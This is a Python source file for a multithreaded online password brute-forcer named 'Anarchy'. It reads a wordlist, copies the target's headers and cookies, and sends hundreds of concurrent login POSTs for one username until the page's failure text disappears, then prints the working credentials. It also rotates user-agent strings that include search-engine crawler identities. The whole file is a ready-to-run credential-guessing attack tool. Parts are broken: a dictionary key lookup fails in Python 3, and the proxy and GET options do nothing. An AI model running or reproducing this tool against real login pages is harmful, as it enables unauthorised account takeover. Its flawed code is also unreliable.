from argparse import ArgumentParser
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import logging
import socks
import requests
import random
import time

SUPPORTED_METHODS = (
    "GET",
    "POST"
)

USERAGENTS = (
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",

    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.3; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",

    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",

    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80",

    # Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",

    # Android
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",

    # Googlebot
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",

    # Bingbot
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",

    # curl
    "curl/8.5.0",

    # Wget
    "Wget/1.21.4",

    # Python requests
    "python-requests/2.31.0",

    # Java HttpClient
    "Java/11.0.20",
)

VERBOSE_LEVEL = {
    0: (logging.INFO, "INFO"),
    1: (logging.DEBUG, "DEBUG"),
    2: (logging.NOTSET, "ALL")
}

OPTION_TARGET : str = ""
OPTION_USER : str = ""
OPTION_LIST : str = ""
OPTION_PARAM : str = ""
OPTION_METHOD : str = ""
OPTION_FAILED : str = ""
OPTION_PROXY : str = ""
OPTION_BYPASS : bool = False
OPTION_WORKER : int = 300
OPTION_VERBOSE = (logging.INFO, "INFO")

PASSWORDS = []
BREAK = False
FOUND_DATA = {}
RETRIES = {}

def requestPOST(url : str, headers : dict, cookies : dict, data : dict, fail_string : str):
    global BREAK, FOUND_DATA, RETRIES
    try:
        req = None
        if len(headers.keys()) != 0 and len(cookies.keys()) != 0:
            req = requests.post(url, headers=headers, cookies=cookies, data=data)
        else:
            req = requests.post(url, data=data)
        content = req.text
        if not fail_string in content:
            BREAK = True
            FOUND_DATA = data
        req.close()
    except Exception as ex:
        pwd = data[data.keys()[1]]
        if pwd in RETRIES.keys():
            RETRIES[pwd] += 1
        else:
            RETRIES[pwd] = 0
            
        if not RETRIES[pwd] >= 20:
            t = Thread(target=requestPOST, args=(url, headers, cookies, data, fail_string))
            t.daemon = True
            t.start()
        else:
            logging.error(ex)

def main():
    logging.basicConfig(format='[%(levelname)s] %(asctime)s - %(message)s', level=OPTION_VERBOSE[0])
    with open(OPTION_LIST, 'rb') as fp:
        data = fp.read()
        for pwd in data.split(b"\n"):
            try:
                pwd = str(pwd.decode()).replace("\n", "")
                PASSWORDS.append(pwd)
            except Exception as e:
                logging.error(e)
                continue

    logging.info(f"Target Server: [{OPTION_TARGET}]")
    logging.info(f"Request Method: [{OPTION_METHOD}]")
    logging.info(f"Failed Condition: [{OPTION_FAILED}]")
    logging.info(f"Verbose Level: [{OPTION_VERBOSE[1]}] (Lvl: {OPTION_VERBOSE[0]})")
    logging.info(f"Password List: {OPTION_LIST} (Count: {len(PASSWORDS)})")

    RECON = requests.get(OPTION_TARGET)
    RECON_HEADERS = RECON.headers
    RECON_COOKIES = RECON.cookies

    if OPTION_BYPASS == True:
        RECON_HEADERS = {}
        RECON_COOKIES = {}

    if OPTION_METHOD == "POST":
        with ThreadPoolExecutor(max_workers=OPTION_WORKER) as executor:
            for passwd in PASSWORDS:
                if BREAK == True: break
                username_param, password_param = OPTION_PARAM.split("/")
                data = {username_param : OPTION_USER, password_param : passwd}
                logging.debug(f"Trying... {data}")
                executor.submit(requestPOST, OPTION_TARGET, RECON_HEADERS, RECON_COOKIES, data, OPTION_FAILED)

    logging.info(f"!!! FOUND !!! : {FOUND_DATA}")

if __name__ == "__main__":
    parser = ArgumentParser(prog='Anarchy', usage='%(prog)s [-t TARGET] [-u USER] [-l LIST] [-p PARAMETERS] [-m METHOD] [-f FAILED] [OPTIONS]', description="Advanced Brute Forcer")
    parser.add_argument('--version', action='version', version='%(prog)s 3.0')
    parser.add_argument('-t', '--target', required=True, help="Set the target server (ex. 192.168.68.1:5000, http://example.com)", type=str)
    parser.add_argument('-u', '--user', required=True, help="Set the username (ex. admin)", type=str)
    parser.add_argument('-l', '--list', required=True, help="Set the password list file (ex. rockyou.txt)", type=str)
    parser.add_argument('-p', '--parameters', required=True, help="Set username and password parameter key (ex. username/password)", type=str)
    parser.add_argument('-m', '--method', required=True, help="Set the request method (ex. GET, POST)", type=str, choices=SUPPORTED_METHODS)
    parser.add_argument('-f', '--failed', required=True, help="Specifies a string that can be checked for failure.", type=str)
    parser.add_argument('-w', '--worker', required=False, help="Specifies the thread limit", type=int, default=200)
    parser.add_argument('-v', '--verbose', required=False, help="Set verbose level (ex. -vvv)", action='count', default=0)
    parser.add_argument('--bypass', required=False, help="Disable security bypass", action='store_true', default=False)
    parser.add_argument('--proxy', required=False, help="Specifies the proxy server (ex. http://127.0.0.1:9050)", type=str)

    args = parser.parse_args()

    OPTION_TARGET = str(args.target)
    OPTION_USER = str(args.user)
    OPTION_LIST = str(args.list)
    OPTION_PARAM = str(args.parameters)
    OPTION_METHOD = str(args.method)
    OPTION_FAILED = str(args.failed)
    OPTION_PROXY = str(args.proxy)
    OPTION_BYPASS = bool(args.bypass)
    OPTION_WORKER = int(args.worker)
    OPTION_VERBOSE = VERBOSE_LEVEL.get(args.verbose) if int(args.verbose) <= 2 else VERBOSE_LEVEL.get(2)

    main()